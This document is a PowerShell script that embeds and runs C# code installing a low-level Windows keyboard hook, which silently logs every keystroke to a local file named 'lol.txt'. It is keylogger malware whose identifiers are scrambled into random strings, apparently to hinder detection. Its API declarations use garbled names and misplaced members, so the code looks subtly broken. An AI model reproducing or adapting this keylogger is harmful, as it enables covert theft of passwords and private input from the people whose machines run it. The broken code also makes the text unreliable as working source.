Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
namespace Hello {
    [DllImport("user32.dll")]
    private static extern IntPtr fddsafdsaf(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")]
    private static extern bool gffdsgfdsgsd(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr hgfshgfdhgfd(IntPtr hhk, int kfhfdskfjhdsf, IntPtr gfdsgfdsgfdsg, IntPtr sfdgfdsgfdsgfds);
    [DllImport("kernel32.dll")]
    private static extern IntPtr hgffdhgfdhgdf(string lpModuleName);
    public static class Program {
    private const int fgfdshgfhgfdh = 13;
    private static HookProc fksfdjsg = HookCallback;
    private const string kdhfiurewriugh = "lol.txt";
    private const int jdfhdksahfkdsa = 16;
    private static StreamWriter gfdfdgshfhshgsh;
    private const int fkjdsfkdsfds = 12;
    private const int hgfhgfdgfdhgf = 0x0100;
    private static IntPtr fdhgfdsgfdsgfds = IntPtr.Zero;
    public static void Main() {
      gfdfdgshfhshgsh = File.AppendText(kdhfiurewriugh);
      gfdfdgshfhshgsh.AutoFlush = true;
      fdhgfdsgfdsgfds = SetHook(fksfdjsg);
      Application.Run();
      gffdsgfdsgsd(fdhgfdsgfdsgfds);
    }
    private static IntPtr SetHook(HookProc fksfdjsg) {
      IntPtr fdshkjfdshs = hgffdhgfdhgdf(Process.GetCurrentProcess().MainModule.ModuleName);
      return fddsafdsaf(fgfdshgfhgfdh, fksfdjsg, fdshkjfdshs, 0);
    }
    private delegate IntPtr HookProc(int kfhfdskfjhdsf, IntPtr gfdsgfdsgfdsg, IntPtr sfdgfdsgfdsgfds);
    private static IntPtr HookCallback(int kfhfdskfjhdsf, IntPtr gfdsgfdsgfdsg, IntPtr sfdgfdsgfdsgfds) {
      if (kfhfdskfjhdsf >= 0 && gfdsgfdsgfdsg == (IntPtr)hgfhgfdgfdhgf) {
        int jsfghgsfjfdshgfh = Marshal.ReadInt32(sfdgfdsgfdsgfds);
        gfdfdgshfhshgsh.WriteLine((Keys)jsfghgsfjfdshgfh);
      }
      return hgfshgfdhgfd(fdhgfdsgfdsgfds, kfhfdskfjhdsf, gfdsgfdsgfdsg, sfdgfdsgfdsgfds);
    }
  }
}
"@ -ReferencedAssemblies System.Windows.Forms
[Hello.Program]::Main();
